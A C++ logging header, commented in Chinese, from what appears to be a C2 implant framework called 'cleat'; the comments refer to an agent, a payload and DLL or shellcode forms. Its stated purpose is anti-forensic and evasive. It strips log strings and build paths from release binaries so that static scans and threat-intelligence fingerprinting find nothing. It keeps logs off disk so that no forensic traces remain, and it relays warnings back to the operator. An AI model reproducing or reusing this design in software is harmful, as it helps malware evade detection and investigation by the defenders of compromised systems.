#pragma once

#include <atomic>
#include <chrono>
#include <cstdio>
#include <ctime>
#include <functional>
#include <iomanip>
#include <memory>
#include <mutex>
#include <sstream>
#include <string>

namespace cleat {

	enum class LogLevel : int {
		__DEBUG = 0,
		INFO = 1,
		WARN = 2,
		_ERROR = 3,
		OFF = 4
	};

	// ---------- 编译期日志下限(敏感数据保护: 静态特征摘除) ----------
	// 运行时 GetLevel() 只能挡住"输出": 消息字面量仍留在 .rdata 里被 strings 命中。
	// 低于下限的 LOG_* 调用点在编译期整体消失(字面量与参数表达式都不进产物)。
	// 默认: 交付(NDEBUG)=WARN —— agent 端不携带框架诊断文本; 开发=DEBUG(全量)。
	// 覆盖: -DCLEAT_LOG_MIN_LEVEL=0|1|2|3 (0=DEBUG 1=INFO 2=WARN 3=ERROR), 见 CMakeLists。
	// 约束: 下限过滤会移除整条日志语句。即使误用裸 LOG(level, msg) 宏, if constexpr
	// 也会在低于下限时整条丢弃 —— 但请勿在日志参数中写入带副作用的表达式
	// (交付/开发构建的行为差异会让副作用只在调试时发生)。
#ifndef CLEAT_LOG_MIN_LEVEL
#ifdef NDEBUG
#define CLEAT_LOG_MIN_LEVEL 2
#else
#define CLEAT_LOG_MIN_LEVEL 0
#endif
#endif

	// 交付构建不带源码位置: __FILE__ 会把编译机绝对路径(形如 D:\...\Agent\...)写进每个
	// 日志点的 .rdata —— 比 C2 地址更扎眼的静态特征, 也是情报里最好用的框架指纹。
	// 注意: Release 传 file=nullptr, Log() 内部按此选择短格式串(此前"格式串减槽位 +
	// 实参照传"会让消息槽位吃到 file 实参, 输出恒为 "?", 真实消息被丢弃)。
#ifdef NDEBUG
#define CLEAT_LOG_FILE  nullptr
#define CLEAT_LOG_LINE  0
#else
#define CLEAT_LOG_FILE  __FILE__
#define CLEAT_LOG_LINE  __LINE__
#define CLEAT_LOG_FMT   "[%04d-%02d-%02d %02d:%02d:%02d] [%s] [%s:%d] %s\n"
#endif

	// 日志事件上报载荷(供 SetEventSink 的接收方组装推送帧)
	struct EventRecord {
		LogLevel level;
		std::string file;
		int line;
		std::string message;
		int64_t ts_ms;
	};

	class Logger {
	public:
		static Logger& Instance() {
			static Logger instance;
			return instance;
		}

		// 设置最低输出级别（低于该级别的不输出）
		void SetLevel(LogLevel level) {
			level_.store(level, std::memory_order_relaxed);
		}

		LogLevel GetLevel() const {
			return level_.load(std::memory_order_relaxed);
		}

		using EventSink = std::function<void(const EventRecord&)>;

		// 注入事件上报通道(组合根调用): WARN 及以上级别日志会回调 sink。
		// 依赖方向: Logger(Common) 只声明回调, 不知道发送方 —— 由组合根
		// (AgentContext) 注入组帧+发送, 避免 Common→Core 反向依赖。
		void SetEventSink(EventSink sink) {
			std::lock_guard<std::mutex> lock(mutex_);
			sink_ = std::move(sink);
		}

		// 日志方向三通道
		//   ① 业务结果 → response 帧回传(永远) ② 诊断事件 → sink 回传 WARN+(远程可调级别)
		//   ③ 本地输出 → 控制台 fwrite; --log-file <path> 显式打开才落盘(默认关, 无取证痕迹)
		// 正式 payload: 不传 --log-file + 远程 runtime.log_level 收敛到 WARN, agent 端零日志落盘。
		void SetLogFile(const char* path) {
			std::lock_guard<std::mutex> lock(mutex_);
			if (file_) {
				std::fclose(file_);
				file_ = nullptr;
			}
			if (path && *path) {
				file_ = std::fopen(path, "a");   // 追加模式; 失败静默回退控制台
			}
		}


		// 核心输出方法（线程安全）
		void Log(LogLevel level,
			const char* file,
			int line,
			const std::string& message) {
			// 事件上报: 独立于本地输出级别, WARN 及以上推给 sink(组合根注入)。
			// sink 调用在锁外 —— 发送可能耗时, 不能阻塞日志输出。
			if (level >= LogLevel::WARN) {
				EventRecord rec{
					level,
					file ? file : "",
					line,
					message,
					std::chrono::duration_cast<std::chrono::milliseconds>(
						std::chrono::system_clock::now().time_since_epoch()).count()
				};
				EventSink sink;
				{
					std::lock_guard<std::mutex> lock(mutex_);
					sink = sink_;
				}
				if (sink) {
					// 上报通道不得击穿日志系统: sink 异常(如发送抛错)在此吞掉,
					// 否则异常会穿过 SEH 边界触发崩溃(实测: 0xE06D7363 崩溃重启)
					try {
						sink(rec);
					}
					catch (...) {
						// 忽略: 上报失败不影响本地日志
					}
				}
			}

			if (level < GetLevel()) {
				return;
			}

			std::lock_guard<std::mutex> lock(mutex_);
			// 本地输出: 用 stdio(fwrite) 替代被注释的 iostream(cout/cerr) ——
			// 无 locale/stream 对象开销, 且不依赖 <iostream>; 无控制台句柄时静默
			// (DLL/shellcode 形态 GetStdHandle 为 NULL, fwrite 自然无输出)。
			// 时间戳
			auto now = std::chrono::system_clock::now();
			auto time_t = std::chrono::system_clock::to_time_t(now);
			// 线程安全: 使用 localtime(整个输出已加锁)
			auto tm = *std::localtime(&time_t);

			// 格式化 + 输出(snprintf 固定缓冲, 无动态分配)。
			// 注意: snprintf 的多余实参虽然被忽略, 但"格式串少两个槽位 + 实参多两个"
			// 会让 %s 消息槽位吃到 file 实参(Release 下为 "?"), 真正的 message
			// (最后一个实参)反被丢弃 —— 必须按 file 是否存在分支选格式串。
			char buf[512];
			int n;
			if (file) {
				n = std::snprintf(buf, sizeof(buf),
					"[%04d-%02d-%02d %02d:%02d:%02d] [%s] [%s:%d] %s\n",
					tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday,
					tm.tm_hour, tm.tm_min, tm.tm_sec,
					LevelToString(level), file, line, message.c_str());
			}
			else {
				n = std::snprintf(buf, sizeof(buf),
					"[%04d-%02d-%02d %02d:%02d:%02d] [%s] %s\n",
					tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday,
					tm.tm_hour, tm.tm_min, tm.tm_sec,
					LevelToString(level), message.c_str());
			}
			// 直接当 fwrite 长度会从 512B 栈缓冲越界读并把栈内存泄进日志 —— 钳到实际
			// 写入量(截断语义不变, 只是读不越界)。
			if (n > 0) {
				const int w = n < static_cast<int>(sizeof(buf)) ? n : static_cast<int>(sizeof(buf)) - 1;
				if (file_) {
					// 落盘模式(--log-file 显式开启): 与业务结果分离, 仅诊断
					std::fwrite(buf, 1, static_cast<size_t>(w), file_);
					std::fflush(file_);
				}
				else {
					FILE* out = (level >= LogLevel::WARN) ? stderr : stdout;
					std::fwrite(buf, 1, static_cast<size_t>(w), out);
					std::fflush(out);   // 实时刷出(重定向到文件/管道时保持可见)
				}
			}
		}

	private:
		Logger() = default;
		~Logger() = default;

		static const char* LevelToString(LogLevel level) {
			switch (level) {
			case LogLevel::__DEBUG: return "DEBUG";
			case LogLevel::INFO:  return "INFO";
			case LogLevel::WARN:  return "WARN";
			case LogLevel::_ERROR: return "ERROR";
			default: return "UNKNOWN";
			}
		}

		std::atomic<LogLevel> level_{ LogLevel::__DEBUG };
		std::mutex mutex_;
		EventSink sink_; // 事件上报通道(组合根注入; 由 mutex_ 保护)
		FILE* file_ = nullptr;   // --log-file 显式开启的本地诊断文件(默认 nullptr = 不落盘)
	};

	// ---------- 宏定义（使用更简洁） ----------
	// 级别预过滤: 低于当前级别时不组装字符串(避免低级别日志的 ostringstream 开销)。
	// 的 sink 推送先于本地输出门控, 事件遥测承诺"独立于本地输出级别"; 若在此处
	// 预过滤, 远程把 runtime.log_level 收敛到 ERROR/OFF 会连带关掉 WARN 遥测
	// (本地输出仍由 Log() 内的 GetLevel() 门控, 行为不变)。DEBUG/INFO 维持预过滤。
	// 编译期下限(if constexpr): 低于 CLEAT_LOG_MIN_LEVEL 的级别整条消失 —— 静态字面量
	// 与 __FILE__/__LINE__ 都不进产物。保持语句形态, 便于用在
	// `if (cond) LOG_XXX(...); else ...` 这类不带大括号的位置。
#define LOG(level, msg) \
    do { \
        if constexpr (static_cast<int>(cleat::LogLevel::level) < CLEAT_LOG_MIN_LEVEL) { \
            /* 编译期摘除: 低于下限的级别不产生任何代码 */ \
        } \
        else if constexpr (static_cast<int>(cleat::LogLevel::level) >= 2) { \
            /* WARN+/ERROR 不受运行时级别预过滤(遥测独立性, 见上); \
               不写成 "常量 || 运行时判定" 一条表达式 —— MSVC /W4 对 \
               常量短路会报 C4127, 会污染全部 WARN/ERROR 站点 */ \
            std::ostringstream _log_stream; \
            _log_stream << msg; \
            cleat::Logger::Instance().Log(cleat::LogLevel::level, CLEAT_LOG_FILE, CLEAT_LOG_LINE, _log_stream.str()); \
        } \
        else if (cleat::LogLevel::level >= cleat::Logger::Instance().GetLevel()) { \
            std::ostringstream _log_stream; \
            _log_stream << msg; \
            cleat::Logger::Instance().Log(cleat::LogLevel::level, CLEAT_LOG_FILE, CLEAT_LOG_LINE, _log_stream.str()); \
        } \
    } while (0)

	// 预处理器层再摘一层: 低于下限的 LOG_* 直接展开为空语句((void)0),
	// 参数表达式完全不参与解析; 即使 CLEAT_LOG_MIN_LEVEL 被覆盖为更高值也保持行为一致。
#if CLEAT_LOG_MIN_LEVEL <= 0
#define LOG_DEBUG(msg) LOG(__DEBUG, msg)
#else
#define LOG_DEBUG(msg) ((void)0)
#endif

#if CLEAT_LOG_MIN_LEVEL <= 1
#define LOG_INFO(msg)  LOG(INFO, msg)
#else
#define LOG_INFO(msg)  ((void)0)
#endif

#if CLEAT_LOG_MIN_LEVEL <= 2
#define LOG_WARN(msg)  LOG(WARN, msg)
#else
#define LOG_WARN(msg)  ((void)0)
#endif

#if CLEAT_LOG_MIN_LEVEL <= 3
#define LOG_ERROR(msg) LOG(_ERROR, msg)
#else
#define LOG_ERROR(msg) ((void)0)
#endif

} // namespace cleat